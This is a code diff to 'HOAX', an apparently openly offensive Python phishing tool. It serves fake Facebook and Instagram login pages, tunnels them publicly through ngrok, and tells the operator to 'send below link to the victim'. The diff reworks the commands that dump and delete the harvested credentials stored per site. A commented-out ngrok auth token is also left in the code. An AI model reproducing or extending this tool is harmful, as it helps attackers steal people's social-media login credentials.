@@ -17,17 +17,17 @@ print(" "+"*"*16 + " HOAX " + "*"*16)
 #help, manual for commands
 
 def help(Command):
-    match Command:
+    match Command[0]:
         case "help":
             print(" [-h, help] for information about how commads work.\n [-v, version] show  the current version of tool.\n [-a, auth] author of the tool. \n [-n, name] tool name.")
             print(" [0] terminates the script")
-            print(" [-dc, dump-cred] shows the all credentials")
-            print(" [-rc, del-cred] delete tha all credentials")
+            print(" [-dc, dump credentials] [sitename] shows the all credentials related to the sitename")
+            print(" [-rc, remove credentials] [sitename] delete tha all credentials related to the sitename")
         case "-h":
             print(" [-h, help] for information about how commads work.\n [-v, version] show  the current version of tool.\n [-a, auth] author of the tool. \n [-n, name] tool name.")
             print(" [0] terminates the script")
-            print(" [-dc, dump-cred] shows the all credentials")
-            print(" [-rc, del-cred] delete tha all credentials")
+            print(" [-dc, dump credentials] [sitename] shows the all credentials related to the site name")
+            print(" [-rc, remove credentials] [sitename] delete the all credentials related to the site name")
         case "version":
             f = open('package.json')
             data = json.load(f)
@@ -59,13 +59,44 @@ def help(Command):
             print(" Name: " + data['name'])
             f.close()
         case "-rc":
-            credentials.del_credential("sites/facebook/log.txt")
+
+            match Command[1]:
+                case "facebook":
+                    try:
+                        credentials.del_credential("sites/"+Command[1]+"/log.txt")
+                    except:
+                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")
+
+                case "instagram":
+                    try:
+                        credentials.del_credential("sites/"+Command[1]+"/log.txt")
+                    except:
+                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")
+                case defualt:
+                    print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")
+
         case "-dc":
-            credentials.find_credentials("sites/facebook/log.txt")
-        case "rm-cred":
-            credentials.del_credential("sites/facebook/log.txt")
-        case "dump-cred":
-            credentials.find_credentials("sites/facebook/log.txt")
+            match Command[1]:
+                case "facebook":
+                    try:
+                        credentials.find_credentials("sites/"+Command[1]+"/log.txt")
+                    except:
+                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")
+
+                case "instagram":
+                    try:
+                        credentials.find_credentials("sites/"+Command[1]+"/log.txt")
+                    except:
+                        print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")
+
+                case defualt:
+                    print(" ERR: Command not found, \""+Command[1]+"\""+" is not valid cammand!")
+
+
+        # case "rm-cred":
+        #     credentials.del_credential("sites/facebook/log.txt")
+        # case "dump-cred":
+        #     credentials.find_credentials("sites/facebook/log.txt")
         case defualt:
             print(" ERR: Command not found, \""+Command+"\""+" is not valid cammand!")
 
@@ -82,8 +113,13 @@ def menu():
 def options(USER_INPUT):
     USER_INPUT = USER_INPUT.strip()
     USER_INPUT = USER_INPUT.lower()
-    if USER_INPUT.isdigit():
-        match USER_INPUT:
+    
+    #list of arguments passes
+    arguments = USER_INPUT.split(" ")
+    
+    #USER_INPUT => arguments[]
+    if arguments[0].isdigit():
+        match arguments[0]:
             case "1":
                 print(" [+] connecting to the Facebook...")
                 time.sleep(3)
@@ -112,7 +148,11 @@ def options(USER_INPUT):
                 print(" ERR: Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")
     else:
         if USER_INPUT != "":
-            help(USER_INPUT)
+            try:
+                help(arguments)
+            except:
+                print(" ERR: Command not found, \""+USER_INPUT+"\""+" is not valid cammand!")
+
         elif USER_INPUT == "":
             return 0
         else:
@@ -129,15 +169,16 @@ def server_run(str_path, prt):
     print(" [+] Link:> http://localhost:" + str(PORT))
     time.sleep(3)
     # Star the server
-    print(" [+] Send below link to the victim. ")
-    # conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
-    url = ngrok.connect(PORT, "http")
-    print(" [+] "+ str(url))
-    time.sleep(3)
-    os.system(comd)
+    try:
+        print(" [+] Send below link to the victim. ")
+        # conf.get_default().auth_token = "299FED0QV81gQREsrXHLmdey2S2_5saXiXSDzhSgxp6AcWPgf"
+        url = ngrok.connect(PORT, "http")
+        print(" [+] "+ str(url))
+        time.sleep(3)
+        os.system(comd)
+    except:
+        print(" Err: Server is not responding!")
 
-
-    # my_server.serve_forever()
 
 #parent function 
 def main():
